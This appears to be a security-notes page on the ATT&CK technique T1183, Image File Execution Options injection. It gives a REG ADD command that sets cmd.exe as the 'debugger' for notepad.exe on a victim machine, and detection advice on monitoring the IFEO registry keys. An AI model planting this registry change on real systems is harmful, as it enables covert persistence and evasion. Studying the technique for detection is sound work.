---
description: 'Defense Evasion, Persistence, Privilege Escalation'
---

# T1183: Image File Execution Options Injection

## Execution

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /d "cmd.exe"
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Launching a notepad on the victim system:

![](../.gitbook/assets/ifeo-notepad.png)

![](../.gitbook/assets/ifeo-notepad2.png)

## Observations

Monitoring commandline arguments and events modifying registry keys: `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options/<executable>` and `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable>` should be helpful in detecting these manipulations:

![](../.gitbook/assets/ifeo-cmdline.png)

![](../.gitbook/assets/ifeo-cmdline2.png)

{% embed data="{\"url\":\"https://attack.mitre.org/wiki/Technique/T1183\",\"type\":\"link\",\"title\":\"Image File Execution Options Injection - ATT&CK for Enterprise\"}" %}

{% embed data="{\"url\":\"https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/\",\"type\":\"link\",\"title\":\"Image File Execution Options \(IFEO\)\",\"description\":\"\[NOTE: This is a repost from my old blog www.debugtricks.com. The old blog no longer exists and I’ll be migrating my old posts over to this blog.\]  Image File Execution options provides you with a mechanism to always launch an executable directly under the debugger. This is extremely useful if you ever need to investigate...\",\"icon\":{\"type\":\"icon\",\"url\":\"https://blogs.msdn.microsoft.com/mithuns/wp-content/themes/microsoft-msdn/images/favicon-msdn.png\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://msdnshared.blob.core.windows.net/media/MSDNBlogsFS/prod.evol.blogs.msdn.com/CommunityServer.Blogs.Components.WeblogFiles/00/00/00/55/05/0572.gflags.gif\",\"width\":546,\"height\":536,\"aspectRatio\":0.9816849816849816}}" %}

{% embed data="{\"url\":\"https://blogs.msdn.microsoft.com/reiley/2011/07/29/a-debugging-approach-to-ifeo/\",\"type\":\"link\",\"title\":\"A Debugging Approach to IFEO\",\"description\":\"IFEO \(Image File Execution Options\) is a feature provided by the NT based operating system. It can be helpful when you are trying to debug at the very beginning of an application launch. A few people also taked about IFEO on MSDN Blogs: Image File Execution Options by Junfeng. Inside ‘Image File Execution Options’ debugging...\",\"icon\":{\"type\":\"icon\",\"url\":\"https://blogs.msdn.microsoft.com/reiley/wp-content/themes/microsoft-msdn/images/favicon-msdn.png\",\"aspectRatio\":0}}" %}

